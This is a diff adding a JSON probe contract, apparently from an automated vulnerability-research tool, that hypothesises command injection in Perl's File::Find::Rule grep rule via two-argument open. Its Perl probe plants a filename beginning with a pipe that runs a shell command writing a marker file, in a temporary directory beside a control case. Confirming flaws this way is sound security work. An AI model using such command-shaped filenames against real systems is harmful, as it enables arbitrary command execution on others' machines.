@@ -1,0 +1,14 @@
+{
+  "contract_version": "corsair-lite/differential-probe/2",
+  "hypothesis": {
+    "target_file": "File/Find/Rule.pm",
+    "target_symbol": "File::Find::Rule::grep",
+    "target_lines": [
+      423
+    ],
+    "root_cause": "The grep rule passes a discovered filename to Perl two-argument open, which interprets a leading pipe as a process-open mode instead of a literal path.",
+    "expected_violation": "searching an owned directory executes the command-shaped filename and creates an owned marker file"
+  },
+  "build_script": "",
+  "probe": "package CorsairProbe;\nuse strict;\nuse warnings;\nuse Cwd qw(getcwd);\nuse File::Find::Rule;\nuse File::Temp qw(tempdir);\n\nour $CONTROL_PAYLOAD = 'ordinary-note.txt';\nour $EXPLOIT_PAYLOAD = '|printf corsair > owned_marker';\n\nsub run_target {\n    my ($payload) = @_;\n    my $root = tempdir('corsair-XXXXXX', TMPDIR => 1, CLEANUP => 1);\n    my $old = getcwd();\n    chdir $root or die \"cannot enter owned directory: $!\";\n    my $invariant;\n    my $completed = eval {\n        open my $handle, '>', $payload or die \"cannot create owned fixture: $!\";\n        print {$handle} \"owned needle\\n\" if $payload eq $CONTROL_PAYLOAD;\n        close $handle or die \"cannot close owned fixture: $!\";\n        if ($payload eq $CONTROL_PAYLOAD) {\n            my @found = File::Find::Rule->file->grep(qr/owned needle/)->in('.');\n            $invariant = scalar grep { $_ eq $payload || $_ eq \"./$payload\" } @found;\n        } else {\n            File::Find::Rule->file->grep(qr/cannot-match/)->in('.');\n            $invariant = !-f 'owned_marker';\n        }\n        1;\n    };\n    my $error = $@;\n    chdir $old or die \"cannot restore directory: $!\";\n    die $error unless $completed;\n    return $invariant ? 1 : 0;\n}\n\n1;\n"
+}
